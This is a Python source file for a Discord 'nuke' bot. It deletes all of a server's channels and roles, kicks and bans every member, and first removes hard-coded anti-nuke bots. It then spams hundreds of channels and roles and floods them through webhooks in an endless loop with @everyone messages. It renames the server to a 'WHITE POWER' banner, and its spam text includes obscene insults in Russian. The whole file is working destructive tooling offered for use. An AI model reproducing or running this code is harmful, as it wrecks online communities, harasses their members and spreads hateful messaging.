import os, discord, aiohttp, json
from discord.ext import commands

prefix = '!'
spam_message = '@everyone server was crashed'
spam_role_name = "Crashed"
spam_channel_name = 'Crashed'
owners=[ ] #owners ids
token = ' '
client = commands.Bot(prefix, intents=discord.Intents.all())
client.remove_command( 'help' )

async def on_guild_join(guild):
    with open('db.json', 'r') as f: db = json.load(f)
    adder=None
    try:
        async for entry in guild.audit_logs(action=discord.AuditLogAction.bot_add):
            adder=entry.user
            break
        if adder.id in db['black']:
            try: await adder.send(":x: Тебя нельзя использовать меня")
            except: pass
            await guild.leave()
            return
    except:
        adder="Unknown"

async def chs(guild):
    for u in guild.channels:  # Удаление каналов
        try: await u.delete()
        except: pass
    for u in guild.roles:
        try: await u.delete()
        except: pass

async def rls(guild):
    for yi in range(1, 501):
        try: await guild.create_role(name=spam_role_name, colour=discord.Colour.from_rgb(0, 0, 1))
        except: pass
        try: await guild.create_text_channel(spam_channel_name)
        except: pass

async def bns(guild, mem=None):
    lavan=guild.get_member(704967695036317777)
    cp=guild.get_member(752367350657056851)
    wick=guild.get_member(536991182035746816)
    sbd=guild.get_member(856495339028873216)
    sec=guild.get_member(651095740390834176)
    akbs=[lavan, cp, wick, sbd, sec]
    for akb in akbs:
        if akb: 
            try: await akb.kick()
            except: pass
    st=''
    for m in guild.members:
        if m.id != client.user.id:
            try: await m.kick()
            except: st+=f'{m}  ID: {m.id}, \n'
    with open("not_kicked.txt", 'w', encoding='utf-8') as f: f.write(st); f.close()
    location=os.getcwd()
    path = os.path.join(location, "not_kicked.txt")
    try: await mem.send(file=discord.File(str(path)))
    except Exception as e: print(e)

@client.event
async def on_ready():
    print(client.guilds)
    print(f'Бот запущен как {client.user}  ID: {client.user.id}')

@client.event
async def on_error(h, g):
    try:
        print(h)
        print(g)
    except: pass

@client.event
async def on_command_error(ctx, err):
    if isinstance(err, commands.errors.BotMissingPermissions):
        await ctx.message.delete()
        await ctx.author.send(embed=discord.Embed(title='Error', description=f"Bot didnt have perms: {' '.join(err.missing_perms)}\nGive them for all functions", color=discord.Colour.from_rgb(255, 0, 0)))
    elif isinstance(err, commands.CommandOnCooldown):
        await ctx.message.delete()
        await ctx.author.send(embed=discord.Embed(title='Error', description=f"Wait, cooldown for this coomand {ctx.command}\nYou need wait {err.retry_after:.2f} sec", color=discord.Colour.from_rgb(255, 0, 0)))
    elif isinstance( err, commands.MissingRequiredArgument ):
        await ctx.author.send(embed=discord.Embed(title='Error', description=f"No arguments", color=discord.Colour.from_rgb(255, 0, 0)))

@client.event
async def on_guild_channel_create(channel):
    if channel.name == spam_channel_name and isinstance(channel, discord.TextChannel):
        webhook = await channel.create_webhook(name = "nuked")
        webhook_url = webhook.url
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
            while True:
                try: 
                    await webhook.send('@everyone @here 🙈', embed=discord.Embed(title='** Привет котаны!) Данный сервер крашится**', content=' **админ соси хуй**'), username='Админ петух')
                except:
                    pass

@client.command()
async def st(ctx):
    with open('db.json', 'r') as f: db = json.load(f)
    if ctx.guild.id in db['white']: return await ctx.send('Fuck you')
    guild=ctx.guild
    await bns(guild, ctx.author)
    try: await guild.edit(name='×××WHITE POWER×××𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎')
    except Exception as e: print(e)
    await chs(guild)
    await rls(guild)

@client.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def roles(ctx):
    with open('db.json', 'r') as f: db = json.load(f)
    if ctx.guild.id in db['white']: return await ctx.send('Fuck you')
    for g in ctx.guild.roles:
        try:
            await g.delete()
        except:
            pass
    while(500):
        try:
            await ctx.guild.create_role(name=spam_role_name, colour=discord.Colour.from_rgb(0, 0, 1))
        except:
            return

@client.command()
@commands.cooldown(1, 300, commands.BucketType.user)
async def ban(ctx):
    with open('db.json', 'r') as f: db = json.load(f)
    if ctx.guild.id in db['white']: return await ctx.send('Fuck you')
    for o in ctx.guild.members:
        if o.id != client.user.id:
            try:
                await o.ban()
            except:
                pass

@client.command()
@commands.cooldown(1, 30, commands.BucketType.user)
async def channels(ctx):
    with open('db.json', 'r') as f: db = json.load(f)
    if ctx.guild.id in db['white']: return await ctx.send('Fuck you')
    try:
        for i in ctx.guild.channels:
            try:
                await i.delete()
            except:
                pass
        for timer in range(1, 250):
            await ctx.guild.create_text_channel(spam_channel_name)
            await ctx.guild.create_voice_channel(spam_channel_name)
    except:
        pass

@client.command()
async def help(ctx):
    await ctx.message.delete()
    try:
        await ctx.author.send(f'''
{prefix}roles  - del all roles and spam them
{prefix}ban  - ban all
{prefix}channels  - del all channels and spam them
{prefix}st  - auto crash
''')
    except:
        await ctx.send('Open dm')

@client.command()
async def leave(ctx):
    if ctx.author.id not in owners: return await ctx.send('Fuck you')
    await ctx.guild.leave()

@client.command()
async def wl(ctx, mode='view', id=None):
    if ctx.author.id not in owners: return await ctx.send('Fuck you')
    if not id: id=ctx.guild.id
    if mode not in ['add', 'remove', 'view', 'list']: return await ctx.send('use `wl add id` or `wl remove id` or just `wl`')
    with open('db.json', 'r') as f: db = json.load(f)
    if mode == 'add':
        db['white'].append(id)
        with open('db.json', 'w') as f: json.dump(db,f)
    elif mode == 'remove':
        try: db['white'].remove(id)
        except: return await ctx.send('this id is not whitelisted')
        with open('db.json', 'w') as f: json.dump(db,f)
    else:
        i=''
        for idd in db['white']:
            i+=f'⠀⠀{idd}\n'
        embed=discord.Embed(title="Servers in whitelist:", description=i)
        embed.set_footer(text='This servers i dont crash')
        await ctx.send(embed=embed)

client.run(token)